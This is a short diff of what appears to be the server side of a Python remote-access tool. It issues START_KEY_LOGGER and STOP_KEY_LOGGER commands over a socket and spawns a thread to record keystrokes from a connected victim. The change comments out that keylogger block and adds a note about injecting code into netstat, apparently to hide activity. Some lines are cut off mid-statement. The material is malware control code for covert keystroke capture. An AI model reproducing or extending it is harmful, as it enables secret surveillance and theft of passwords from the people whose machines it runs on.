@@ -127,18 +127,23 @@ if __name__ == '__main__':
         # print(data)
 
         # start key logger
-        SocketManager.send_data(conn, "START_KEY_LOGGER")
-        key_logger_file = KEY_LOGGER_FILE
-        # create a new thread of key logger
-        key_logger_thread_handle = Thread(target=key_logger_thread, args=(conn, key_logger_file,))
-        key_logger_thread_handle.start()
+        # SocketManager.send_data(conn, "START_KEY_LOGGER")
+        # key_logger_file = KEY_LOGGER_FILE
+        # # create a new thread of key logger
+        # key_logger_thread_handle = Thread(target=key_logger_thread, args=(conn, key_logger_file,))
+        # key_logger_thread_handle.start()
+        #
+        # # stop key logger
+        # SocketManager.send_data(conn, "STOP_KEY_LOGGER")
+        # # kill the thread of key logger
+        # if key_logger_thread_handle is None or not key_logger_thread_handle.is_alive():
+        #     print("No key logger is running")
+        # else:
+        #     key_logger_thread_handle.
 
-        # stop key logger
-        SocketManager.send_data(conn, "STOP_KEY_LOGGER")
-        # kill the thread of key logger
-        if key_logger_thread_handle is None or not key_logger_thread_handle.is_alive():
-            print("No key logger is running")
-        else:
-            key_logger_thread_handle.
+
+        # Inject new fprintf to netstat
+
+
 
 conn.close()
